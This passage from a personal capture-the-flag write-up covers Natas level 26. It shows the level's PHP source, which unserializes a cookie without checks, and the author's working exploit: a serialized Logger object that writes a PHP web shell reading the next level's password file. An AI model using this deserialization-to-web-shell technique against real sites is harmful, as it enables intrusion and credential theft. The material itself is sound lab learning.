        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Having worked with such bugs in my coursework here at [CISPA](https://cispa.de/), I immediately noticed the problem. There is an insecure deserialization of the cookie used for drawing the line (the challenge involved gettin 4 coordinates as input and drawing the line).

Using the class `Logger` I quickly whipped up an exploit:
```php
<?php

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/fkyeah.php";
	}
}

$exploit = new Logger();
print base64_encode(serialize($exploit)).'\n';
?>
```
Passing the output into the cookie, and visiting the logFile, I got the password. To know more, check out serialization bugs in PHP, this is a default challenge of such a vulnerability.

## Level 27







